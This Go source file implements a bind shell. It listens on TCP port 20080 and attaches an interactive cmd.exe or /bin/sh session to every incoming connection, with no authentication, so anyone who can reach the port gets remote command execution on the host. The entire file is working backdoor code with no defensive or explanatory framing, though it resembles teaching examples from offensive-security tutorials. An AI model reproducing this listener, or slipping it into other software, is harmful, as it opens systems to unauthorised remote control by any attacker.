package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{w: bufio.NewWriter(w)}
}

func (flusher *Flusher) Write(b []byte) (int, error) {
	count, err := flusher.w.Write(b)
	if err != nil {
		return -1, err
	}

	if err := flusher.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

func handle(conn net.Conn) {
	var shell string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else {
		shell = "/bin/sh"
	}
	cmd := exec.Command(shell, "-i")
	cmd.Stdin = conn
	cmd.Stdout = NewFlusher(conn)

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
